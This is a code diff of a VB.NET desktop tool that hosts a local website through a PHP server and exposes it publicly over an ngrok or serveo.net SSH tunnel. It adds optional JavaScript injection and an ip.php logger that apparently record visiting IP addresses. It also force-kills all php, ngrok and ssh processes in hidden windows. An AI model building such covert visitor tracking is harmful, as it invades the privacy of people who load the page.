@@ -109,10 +109,42 @@ Public Class Form1
         End If
     End Sub
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Dim ctx As Double
+        Dim thread As New Thread(
+                   Sub()
+
+                       ctx = 0
+                       Me.Opacity = 0
+
+                       While ctx < 1
+                           Me.Invoke(
+                               Sub()
+
+                                   Me.Opacity = ctx
+                               End Sub
+                           )
+
+                           ctx = ctx + 0.03
+                           Thread.Sleep(30)
+                       End While
+
+
+                       Me.Invoke(
+                           Sub()
+
+                               Me.Opacity = 1
+
+                           End Sub
+                       )
+                   End Sub
+               )
+
+
+        thread.Start()
         Dim gunaScrollBar As New Guna2VScrollBar()
         TextBox1.ScrollBars = ScrollBars.Vertical
         Guna2DataGridView1.ScrollBars = ScrollBars.Vertical
-
+        MakeSlightlyRoundForm(30)
         Try
             If Not File.Exists(Application.StartupPath + "\resources\tsweb.zip") Then
                 Try
@@ -174,6 +206,22 @@ Public Class Form1
         Label1.Visible = True
         Label3.Visible = True
         Timer2.Start()
+    End Sub
+    Private Sub MakeSlightlyRoundForm(radius As Integer)
+        ' Create a GraphicsPath to define the shape of the form (rounded rectangle in this case)
+        Dim path As New System.Drawing.Drawing2D.GraphicsPath()
+        path.AddLine(radius, 0, Me.Width - radius, 0)
+        path.AddArc(Me.Width - radius, 0, radius, radius, 270, 90)
+        path.AddLine(Me.Width, radius, Me.Width, Me.Height - radius)
+        path.AddArc(Me.Width - radius, Me.Height - radius, radius, radius, 0, 90)
+        path.AddLine(Me.Width - radius, Me.Height, radius, Me.Height)
+        path.AddArc(0, Me.Height - radius, radius, radius, 90, 90)
+        path.AddLine(0, Me.Height - radius, 0, radius)
+        path.AddArc(0, 0, radius, radius, 180, 90)
+
+        ' Set the Region property of the form to the created GraphicsPath
+        Me.Region = New Region(path)
+
     End Sub
     Private Async Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
         If currentIndex < targetText.Length Then
@@ -241,14 +289,14 @@ Public Class Form1
         End If
     End Sub
     Private Async Sub Guna2GradientButton3_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton3.Click
-        If My.Settings.ngrokex = "nullable" Then
-            grok.Show()
-        Else
-            If svc = False Then
-                If String.IsNullOrWhiteSpace(Guna2TextBox1.Text) Or Guna2TextBox1.Text = String.Empty Then
-                    Guna2TextBox1.Text = Application.StartupPath + "\resources\tsweb"
-                    Dim x As String = Guna2TextBox1.Text()
-                    Dim htmlFilePath As String = Guna2TextBox1.Text + "\index.html"
+        If My.Settings.ngrokex = "nullable" And Not My.Settings.serveouse Then grok.Show()
+
+        If svc = False Then
+            If String.IsNullOrWhiteSpace(Guna2TextBox1.Text) Or Guna2TextBox1.Text.Length < 5 Then
+                Guna2TextBox1.Text = Application.StartupPath + "\resources\tsweb"
+                Dim x As String = Guna2TextBox1.Text()
+                Dim htmlFilePath As String = Guna2TextBox1.Text + "\index.html"
+                If My.Settings.ipinject Then
                     Try
                         File.Create(Guna2TextBox1.Text + "\ip.json")
                         WritePhpCodeToFile(Guna2TextBox1.Text + "\ip.php")
@@ -261,8 +309,18 @@ Public Class Form1
                         MessageBox.Show("index.html file not found.")
                         Exit Sub
                     End If
-                    StartphpSERVER(x)
+                End If
+
+                StartphpSERVER(x)
+                If My.Settings.serveouse Then
+                    RunCommandAndCaptureOutput()
+
+
+                Else
                     StartNgrokAsync()
+
+
+
                     Threading.Thread.Sleep(500)
                     Await DownloadWebsite("http://127.0.0.1:4040/api/tunnels", Application.StartupPath + "\resources\tunnels.json")
                     Threading.Thread.Sleep(1500)
@@ -273,11 +331,18 @@ Public Class Form1
                         Exit Sub
                     End If
                     Timer3.Start()
-                Else
-                    Dim folderBrowserDialog As New FolderBrowserDialog()
-                    If folderBrowserDialog.ShowDialog() = DialogResult.OK Then
-                        Guna2TextBox1.Text = folderBrowserDialog.SelectedPath
-                        Dim htmlFilePath As String = Guna2TextBox1.Text + "\index.html"
+                End If
+            Else
+                Dim folderBrowserDialog As New FolderBrowserDialog()
+                If folderBrowserDialog.ShowDialog() = DialogResult.OK Then
+                    Guna2TextBox1.Text = folderBrowserDialog.SelectedPath
+                    Dim htmlFilePath As String = Guna2TextBox1.Text + "\index.html"
+                    If My.Settings.ipinject Then
+                        Try
+                            File.Create(Guna2TextBox1.Text + "\ip.json")
+                            WritePhpCodeToFile(Guna2TextBox1.Text + "\ip.php")
+                        Catch ex As Exception
+                        End Try
                         If File.Exists(htmlFilePath) Then
                             Dim htmlContent As String = File.ReadAllText(htmlFilePath)
                             InjectJavaScriptIntoHTML(htmlContent)
@@ -285,15 +350,19 @@ Public Class Form1
                             MessageBox.Show("index.html file not found.")
                             Exit Sub
                         End If
-                        Try
-                            File.Create(Guna2TextBox1.Text + "\ip.json")
-                            WritePhpCodeToFile(Guna2TextBox1.Text + "\ip.php")
-                        Catch ex As Exception
-                        End Try
-                        Dim x As String = Guna2TextBox1.Text()
+                    End If
+                    Dim x As String = Guna2TextBox1.Text()
 
-                        StartphpSERVER(x)
+                    StartphpSERVER(x)
+                    If My.Settings.serveouse Then
+                        RunCommandAndCaptureOutput()
+
+
+                    Else
                         StartNgrokAsync()
+
+
+
                         Threading.Thread.Sleep(500)
                         Await DownloadWebsite("http://127.0.0.1:4040/api/tunnels", Application.StartupPath + "\resources\tunnels.json")
                         Threading.Thread.Sleep(1500)
@@ -301,48 +370,89 @@ Public Class Form1
                         DisplayPublicUrlInTextBox(publicUrl)
                         If publicUrl = String.Empty Then
                             Guna2CustomCheckBox1.Checked = False
-                            Guna2GradientButton3.FillColor = Color.DarkBlue
-                            Guna2GradientButton3.Text = "Restart the server"
                             Exit Sub
                         End If
                         Timer3.Start()
-                    Else
-                        Exit Sub
-
                     End If
-                    End If
-                Guna2GradientButton3.FillColor = Color.DarkRed
-                Guna2GradientButton3.Text = "Close the server"
-                svc = True
-            Else
-                Try
-                    Dim psi As ProcessStartInfo = New ProcessStartInfo
-                    psi.WindowStyle = ProcessWindowStyle.Hidden
-                    psi.Arguments = "/im " & "php.exe" & " /f"
-                    psi.FileName = "taskkill"
-                    Dim p As Process = New Process()
-                    p.StartInfo = psi
-                    p.Start()
-                    p.Close()
-                    Dim psi0 As ProcessStartInfo = New ProcessStartInfo
-                    psi0.WindowStyle = ProcessWindowStyle.Hidden
-                    psi0.Arguments = "/im " & "ngrok.exe" & " /f"
-                    psi0.FileName = "taskkill"
-                    Dim p0 As Process = New Process()
-                    p0.StartInfo = psi0
-                    p0.Start()
-                    p0.Close()
-                Catch ex As Exception
-                    MsgBox("ERROR_HDL_CLOSING : TaskKill ngrok and php error")
-                End Try
-                Guna2GradientButton3.FillColor = Color.FromArgb(0, 192, 0)
-                Guna2GradientButton3.Text = "Start the server"
-                Guna2CustomCheckBox2.Checked = False
-                Guna2CustomCheckBox1.Checked = False
-                svc = False
-                Timer3.Stop()
-                TextBox1.Clear()
+                Else
+                    Exit Sub
 
+                End If
+            End If
+            Guna2GradientButton3.FillColor = Color.DarkRed
+            Guna2GradientButton3.Text = "Close the server"
+            svc = True
+        Else
+            Try
+                Dim psi As ProcessStartInfo = New ProcessStartInfo
+                psi.WindowStyle = ProcessWindowStyle.Hidden
+                psi.Arguments = "/im " & "php.exe" & " /f"
+                psi.FileName = "taskkill"
+                Dim p As Process = New Process()
+                p.StartInfo = psi
+                p.Start()
+                p.Close()
+                Dim psi0 As ProcessStartInfo = New ProcessStartInfo
+                psi0.WindowStyle = ProcessWindowStyle.Hidden
+                psi0.Arguments = "/im " & "ngrok.exe" & " /f"
+                psi0.FileName = "taskkill"
+                Dim p0 As Process = New Process()
+                p0.StartInfo = psi0
+                p0.Start()
+                p0.Close()
+            Catch ex As Exception
+                MsgBox("ERROR_HDL_CLOSING : TaskKill ngrok and php error")
+            End Try
+            Guna2GradientButton3.FillColor = Color.FromArgb(0, 192, 0)
+            Guna2GradientButton3.Text = "Start the server"
+            Guna2CustomCheckBox2.Checked = False
+            Guna2CustomCheckBox1.Checked = False
+            svc = False
+            Timer3.Stop()
+            TextBox1.Clear()
+
+        End If
+
+    End Sub
+    Private Async Sub RunCommandAndCaptureOutput()
+        Dim yourCommand As String = $"-R 80:localhost:{My.Settings.port.ToString()} serveo.net"
+        Try
+            Dim cmm As String = "ssh.exe"
+
+
+            Dim processInfo As New ProcessStartInfo(cmm, yourCommand)
+            processInfo.CreateNoWindow = True
+            processInfo.RedirectStandardOutput = True
+            processInfo.RedirectStandardError = True
+            processInfo.UseShellExecute = False
+            processInfo.WindowStyle = ProcessWindowStyle.Hidden
+            Dim sshProcess As New Process()
+            sshProcess.StartInfo = processInfo
+            AddHandler sshProcess.OutputDataReceived, Sub(sender, e) AppendTextToTextBox22(e.Data)
+            AddHandler sshProcess.ErrorDataReceived, Sub(sender, e) AppendTextToTextBox22(e.Data)
+            sshProcess.Start()
+
+            sshProcess.BeginOutputReadLine()
+            sshProcess.BeginErrorReadLine()
+            Await Task.Run(Sub() sshProcess.WaitForExit())
+            sshProcess.Close()
+        Catch ex As Exception
+            Guna2TextBox2.Text = "Error retrieving public url"
+        End Try
+    End Sub
+    Public isLinkCaptured As Boolean = False
+
+    Private Sub AppendTextToTextBox22(text As String)
+        If isLinkCaptured = False AndAlso Not String.IsNullOrEmpty(text) Then
+
+            Dim linkRegex As New System.Text.RegularExpressions.Regex("https://[a-zA-Z0-9\.]+\.serveo\.net")
+            Dim match As System.Text.RegularExpressions.Match = linkRegex.Match(text)
+
+            If match.Success Then
+
+                Guna2TextBox2.Text = match.Value
+
+                isLinkCaptured = True
             End If
         End If
     End Sub
@@ -357,7 +467,8 @@ Public Class Form1
             End If
         Next
         Guna2DataGridView1.DataSource = dt
-        Label8.Text = "LAST_CONNECT " + (Guna2DataGridView1.Rows.Count - 1).ToString()
+        If My.Settings.ipinject Then Label8.Text = "LAST_CONNECT " + (Guna2DataGridView1.Rows.Count - 1).ToString() Else Label8.Text = "Monitor disabled"
+
     End Sub
     Private Sub AppendTextToTextBox(text As String)
         If Not String.IsNullOrEmpty(text) Then
@@ -369,7 +480,7 @@ Public Class Form1
     End Sub
     Public Async Sub StartphpSERVER(webFolderPath As String)
         Dim phpExePath As String = Application.StartupPath + "\resources\php\php.exe"
-        Dim serverOptions As String = "-S localhost:8000 -t ."
+        Dim serverOptions As String = $"-S localhost:{My.Settings.port.ToString()} -t ."
         ChDir(webFolderPath)
         Dim processInfo As New ProcessStartInfo(phpExePath, serverOptions)
         processInfo.CreateNoWindow = True
@@ -498,7 +609,7 @@ Public Class Form1
 
         Else
             MessageBox.Show("Error injecting JavaScript. </body> not found in the HTML content.")
-            Application.Exit()
+
         End If
     End Sub
     Private Sub WritePhpCodeToFile(phpFilePath As String)
@@ -548,6 +659,7 @@ Public Class Form1
             Dim psi As ProcessStartInfo = New ProcessStartInfo
             psi.Arguments = "/im " & "php.exe" & " /f"
             psi.FileName = "taskkill"
+            psi.WindowStyle = ProcessWindowStyle.Hidden
             Dim p As Process = New Process()
             p.StartInfo = psi
             p.Start()
@@ -555,12 +667,22 @@ Public Class Form1
             Dim psi0 As ProcessStartInfo = New ProcessStartInfo
             psi0.Arguments = "/im " & "ngrok.exe" & " /f"
             psi0.FileName = "taskkill"
+            psi0.WindowStyle = ProcessWindowStyle.Hidden
             Dim p0 As Process = New Process()
             p0.StartInfo = psi0
             p0.Start()
             p0.Close()
+            Dim psh As ProcessStartInfo = New ProcessStartInfo
+            psh.Arguments = "/im " & "ssh.exe" & " /f"
+            psh.FileName = "taskkill"
+            psh.WindowStyle = ProcessWindowStyle.Hidden
+            Dim kil As Process = New Process()
+            kil.StartInfo = psh
+            kil.Start()
+            kil.WaitForExit()
+            kil.Close()
         Catch ex As Exception
-            MsgBox("ERROR_HDL_CLOSING : TaskKill ngrok and php error")
+
         End Try
         Application.Exit()
     End Sub
